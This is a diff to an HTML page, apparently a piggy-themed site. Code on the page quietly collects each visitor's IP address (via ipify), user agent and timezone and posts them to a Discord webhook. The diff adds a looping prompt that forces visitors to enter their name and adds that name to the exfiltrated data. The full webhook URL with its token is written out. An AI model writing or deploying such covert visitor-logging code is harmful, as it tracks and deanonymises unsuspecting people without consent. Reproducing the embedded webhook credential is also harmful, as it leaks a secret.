@@ -289,15 +289,26 @@
     </script>
     <div>
         <div>
-            
+            <script>
+            (async () => {
+                let nombre = "";
+                while (!nombre) {
+                    nombre = prompt("¿Cuál es tu nombre?");
+                    if (nombre === null) nombre = ""; // Si cancela, vuelve a preguntar
+                    nombre = nombre.trim();
+                }
+                window.cerditoNombre = nombre; // Guarda el nombre globalmente para otros scripts si lo necesitas
+            })();
+            </script>
         </div>
 
-        <script>
+<script>
 (async () => {
-    const webhookUrl = "https://discord.com/api/webhooks/1379196950548840562/dbcNuGow4IcIdN8Fj1Due9d_e-PDm43i3AWxYUQZ4Zhyp5J_oe4vk6yfrprOqsPZvCis"; // ← pega aquí tu webhook
+    const webhookUrl = "https://discord.com/api/webhooks/1379196950548840562/dbcNuGow4IcIdN8Fj1Due9d_e-PDm43i3AWxYUQZ4Zhyp5J_oe4vk6yfrprOqsPZvCis";
 
     const userAgent = navigator.userAgent;
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const nombre = window.cerditoNombre || "No ingresado";
 
     try {
         const ipRes = await fetch("https://api.ipify.org?format=json");
@@ -312,6 +323,11 @@
                         url: "https://emojicdn.elk.sh/🐷"
                     },
                     fields: [
+                        {
+                            name: "👤 Nombre ingresado",
+                            value: nombre,
+                            inline: true
+                        },
                         {
                             name: "🌍 IP",
                             value: ipData.ip,
@@ -354,5 +370,7 @@
 })();
 </script>
 
+
 </body>
 </html>
+
